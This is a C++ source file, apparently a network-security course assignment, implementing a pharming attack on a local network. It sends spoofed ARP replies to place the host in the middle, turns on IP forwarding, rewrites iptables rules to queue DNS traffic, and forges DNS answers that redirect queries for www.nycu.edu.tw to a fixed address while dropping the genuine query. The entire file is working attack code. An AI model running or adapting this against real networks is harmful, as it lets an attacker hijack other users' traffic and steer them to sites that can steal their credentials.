#include "pharm_attack.hpp"

// #define INFO 1
#define MAC_LENGTH 6

void handle_sigint(int sig) {
    system("iptables -F");
    system("iptables -F -t nat");
    system("sysctl net.ipv4.ip_forward=0 > /dev/null");
    exit(0);
}

void send_data_udp(char *data, int len, struct NFQData *info) {
    // raw socket
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    // int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket()");
        return;
    }

    uint32_t my_ip = info->local_info.src_ip.sin_addr.s_addr;
    int ifidx = info->local_info.device.sll_ifindex;
    std::array<uint8_t, 6> src_mac = info->local_info.src_mac;
    unsigned char my_mac[6];
    std::copy(src_mac.begin(), src_mac.end(), my_mac);
    // dump ifidx, src_mac, my_ip
    printf("ifidx: %d\n", ifidx);
    printf("src_mac: ");
    for (int i = 0; i < 6; i++) {
        printf("%02x ", my_mac[i]);
    }
    printf("\n");
    printf("my_ip: %s\n", inet_ntoa(info->local_info.src_ip.sin_addr));

    char *sendbuf = new char[1024];
    memset(sendbuf, 0, 1024);
    struct ethhdr *eth = (struct ethhdr *)sendbuf;
    std::array<uint8_t, 4> dest_ip_array;
    for (int i = 0; i < 4; i++) {
        dest_ip_array[i] = data[16 + i];
    }

    memcpy(eth->h_source, my_mac, MAC_LENGTH);

    unsigned char *dest_mac = new unsigned char[6];
    auto it = info->ip_mac_pairs.find(dest_ip_array);
    if (it != info->ip_mac_pairs.end()) {
        std::copy(it->second.begin(), it->second.end(), dest_mac);
        // Now dest_mac contains the MAC address for dest_ip_array
    } else {
        // Handle the case where dest_ip_array is not in the map
        // Print destination IP
        printf("Destination IP: %d.%d.%d.%d not found in map\n", dest_ip_array[0], dest_ip_array[1], dest_ip_array[2], dest_ip_array[3]);
        return;
    }
    memcpy(eth->h_dest, dest_mac, MAC_LENGTH);
    eth->h_proto = htons(ETH_P_IP);

    for (int i = ETH2_HEADER_LEN; i < len + ETH2_HEADER_LEN; i++) {
        sendbuf[i] = data[i - ETH2_HEADER_LEN];
    }

    // dump
    // for(int i=0;i<len+ETH2_HEADER_LEN;i++){
    //     cout << hex << (unsigned)sendbuf[i] << ' ';
    //     if(i%16 == 15) cout << '\n';
    // }
    // cout << '\n';

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(struct sockaddr_ll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifidx;
    if (bind(fd, (struct sockaddr *)&sll, sizeof(struct sockaddr_ll)) < 0) {
        perror("bind");
    }

    struct sockaddr_ll socket_address;
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_IP);
    socket_address.sll_ifindex = ifidx;
    socket_address.sll_hatype = htons(ARPHRD_ETHER);
    socket_address.sll_pkttype = (PACKET_BROADCAST);
    socket_address.sll_halen = MAC_LENGTH;
    socket_address.sll_addr[6] = 0x00;
    socket_address.sll_addr[7] = 0x00;
    memcpy(socket_address.sll_addr, my_mac, MAC_LENGTH);

    if (sendto(fd, sendbuf, len + ETH2_HEADER_LEN, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
        perror("sendto()");
    }
    close(fd);
    delete[] sendbuf;
    delete[] data;

    return;
}

void send_dns_reply(unsigned char *payload, int len, int qlen, struct NFQData *info) {
    char *data = new char[1024];
    for (int i = 0; i < len; i++) {
        data[i] = payload[i];
    }

    // for revising ip header total length and checksum
    struct ip_hdr *iph = (struct ip_hdr *)data;
    int iph_len = (((uint8_t)data[0]) & 0x0F) << 2, udph_len = 8;
    iph->flags = 0;
    uint tmp = iph->src_ip;
    iph->src_ip = iph->dst_ip;
    iph->dst_ip = tmp;

    // for revising udp header length and checksum
    struct udp_hdr *udph = (struct udp_hdr *)(data + iph_len);
    udph->dst_port = udph->src_port;
    udph->src_port = htons(53);

    // for revising dns response content
    struct dns_hdr *new_hdr = (struct dns_hdr *)(data + iph_len + udph_len);

    new_hdr->flags = htons(0x8180);
    // only 1 answer in reply (140.113.24.241)
    new_hdr->ans_cnt = htons(1);
    new_hdr->authrr_cnt = htons(0);
    new_hdr->addrr_cnt = htons(0);

    int resp_mv = iph_len + udph_len + sizeof(struct dns_hdr) + qlen;
    struct resp_hdr *resp = (struct resp_hdr *)(data + resp_mv);
    resp->name = htons(0xc00c);  // compress name
    resp->type = htons(1);       // A record
    resp->cls = htons(1);        // IN internet
    resp->ttl = htonl(5);
    resp->len = htons(4);
    resp_mv += sizeof(struct resp_hdr);
    data[resp_mv] = 140;
    data[resp_mv + 1] = 113;
    data[resp_mv + 2] = 24;
    data[resp_mv + 3] = 241;
    resp_mv += 4;

    // checksum calculation
    // reference: https://bruce690813.blogspot.com/2017/09/tcpip-checksum.html
    udph->len = htons(resp_mv - iph_len);
    udph->checksum = 0;
    // calculate udp checksum
    uint32_t sum = 0;
    // pseudo header
    sum += ntohs(iph->src_ip >> 16) + ntohs(iph->src_ip & 0xFFFF);
    sum += ntohs(iph->dst_ip >> 16) + ntohs(iph->dst_ip & 0xFFFF);
    sum += 0x0011;  // UDP
    sum += (resp_mv - iph_len);
    auto buf = reinterpret_cast<const uint16_t *>(udph);
    int len_buf = (resp_mv - iph_len) % 2 ? (resp_mv - iph_len) / 2 + 1 : (resp_mv - iph_len) / 2;
    for (int i = 0; i < len_buf; i++) {
        sum += ntohs(buf[i]);
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    udph->checksum = ~htons(sum);

    // calculate ip checksum
    iph->tlen = htons(resp_mv);
    iph->checksum = 0;
    sum = 0;
    buf = reinterpret_cast<const uint16_t *>(iph);
    for (int i = 0; i < iph->ihl * 2; i++) {
        sum += ntohs(buf[i] & 0xFFFF);
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    iph->checksum = ~htons(sum);

    // send data out
    send_data_udp(data, resp_mv, info);
}

// Function to handle receiving responses
void receiveHandler(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
    uint8_t buffer[IP_MAXPACKET];
    struct sockaddr saddr;
    int saddr_len = sizeof(saddr);

    while (true) {
        // Receive packet
        int bytes = recvfrom(sd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
        if (bytes < 0) {
            perror("recvfrom() failed");
            exit(EXIT_FAILURE);
        }

        // Check if packet is an ARP packet
        if (buffer[12] == ETH_P_ARP / 256 && buffer[13] == ETH_P_ARP % 256) {
            parseARPReply(buffer, ip_mac_pairs, local_info);
        }
        memset(buffer, 0, IP_MAXPACKET);
        continue;
    }
}

std::string parse_dns_query(const unsigned char *packet, int dns_start, int &dns_name_length) {
    std::string dns_name;
    int dns_name_position = dns_start + sizeof(dns_hdr);
    dns_name_length = 5;  // Include qry.type, qry.class, and final 0 in qname

    while (packet[dns_name_position] != 0) {
        int label_length = packet[dns_name_position];
        dns_name_length += label_length + 1;

        for (int i = 0; i < label_length; i++) {
            dns_name_position++;
            dns_name += packet[dns_name_position];
        }

        dns_name_position++;
    }

    return dns_name;
}

static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
                           struct nfq_data *nfa, void *data) {
    struct nfqnl_msg_packet_hdr *ph;
    struct nfqnl_msg_packet_hw *hwph;
    u_int32_t id = 0;
    struct NFQData *nfq_data = (struct NFQData *)data;

    ph = nfq_get_msg_packet_hdr(nfa);
    if (ph) {
        id = ntohl(ph->packet_id);
    }
    unsigned char *packet;
    int len = nfq_get_payload(nfa, &packet);
    if (len < 0) {
        printf("Error: nfq_get_payload returned %d\n", len);
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }
    // ip header
    struct iphdr *iph = (struct iphdr *)packet;
    // udp header
    struct udphdr *udph = (struct udphdr *)(packet + iph->ihl * 4);

    int iph_len = iph->ihl * 4;
    int udph_len = sizeof(struct udphdr);
    int dport = ntohs(udph->dest);

    if (dport != 53) {
        return nfq_set_verdict(qh, ph->packet_id, NF_ACCEPT, 0, NULL);
    }
    int dns_name_length;
    std::string dns_name = parse_dns_query(packet, iph_len + udph_len, dns_name_length);
    // printf("dns_name: %s\n", dns_name.c_str());

    if (dns_name != "wwwnycuedutw") {
        return nfq_set_verdict(qh, ph->packet_id, NF_ACCEPT, 0, NULL);
    }

    send_dns_reply(packet, len, dns_name_length, nfq_data);
    return nfq_set_verdict(qh, ph->packet_id, NF_DROP, 0, NULL);
}

void NFQHandler(struct LocalInfo local_info, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs) {
    struct nfq_handle *h;
    struct nfq_q_handle *qh;
    struct nfnl_handle *nh;
    int fd;
    int rv;
    char buf[4096] __attribute__((aligned));

    struct NFQData nfq_data;
    nfq_data.local_info = local_info;
    nfq_data.ip_mac_pairs = ip_mac_pairs;

    h = nfq_open();
    if (!h) {
        fprintf(stderr, "error during nfq_open()\n");
        exit(1);
    }
    if (nfq_unbind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_unbind_pf()\n");
        exit(1);
    }
    if (nfq_bind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_bind_pf()\n");
        exit(1);
    }
    qh = nfq_create_queue(h, 0, &handleNFQPacket, &nfq_data);
    if (!qh) {
        fprintf(stderr, "error during nfq_create_queue()\n");
        exit(1);
    }
    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
        fprintf(stderr, "can't set packet_copy mode\n");
        exit(1);
    }
    fd = nfq_fd(h);
    while ((rv = recv(fd, buf, sizeof(buf), 0)) && rv >= 0) {
        nfq_handle_packet(h, buf, rv);
    }
    nfq_destroy_queue(qh);
    nfq_close(h);
}

int main(int argc, char **argv) {
    char *interface;
    struct ifreq ifr;
    int sd;

    struct LocalInfo local_info;

    if (argc != 2) {
        printf("Usage: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Interface to send packet through.
    interface = argv[1];

    // Get source IP address.
    getSourceIP(interface, local_info.src_ip);

    // Get source MAC address.
    getMACAddress(interface, local_info.src_mac);

    // Get netmask.
    getMask(interface, local_info.netmask);

    // Get default gateway.
    getDefaultGateway(interface, local_info.gateway_ip);

    // Find interface index from interface name and store index in
    // struct sockaddr_ll device, which will be used as an argument of sendto().
    if ((local_info.device.sll_ifindex = if_nametoindex(interface)) == 0) {
        perror("if_nametoindex() failed to obtain interface index");
        exit(EXIT_FAILURE);
    }
#ifdef INFO
    printf("src_ip: %s\n", inet_ntoa(local_info.src_ip.sin_addr));
    printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", local_info.src_mac[0], local_info.src_mac[1], local_info.src_mac[2], local_info.src_mac[3], local_info.src_mac[4], local_info.src_mac[5]);
    printf("netmask: %s\n", inet_ntoa(local_info.netmask.sin_addr));
    printf("Index for interface %s is %i\n", interface, local_info.device.sll_ifindex);
    printf("gateway_ip: %s\n", inet_ntoa(local_info.gateway_ip.sin_addr));
#endif

    // Submit request for a raw socket descriptor.
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    sendARPRequest(sd, local_info);

    // Use a table to save IP-MAC pairs
    std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs;

    printf("Available devices\n");
    printf("-----------------------------------------\n");
    printf("IP\t\t\tMAC\n");
    printf("-----------------------------------------\n");

    // Start the threads
    std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
    std::thread receive_thread(receiveHandler, sd, std::ref(ip_mac_pairs), local_info);

    signal(SIGINT, handle_sigint);

    system("sysctl net.ipv4.ip_forward=1 > /dev/null");
    system("iptables -F");
    system("iptables -F -t nat");
    char cmd[100];
    sprintf(cmd, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", interface);
    system(cmd);
    system("iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0");
    system("iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");

    // Start the NFQHandler
    NFQHandler(local_info, ip_mac_pairs);

    // Wait for threads to finish
    send_thread.join();
    receive_thread.join();

    // Close socket descriptor.
    close(sd);

    return (EXIT_SUCCESS);
}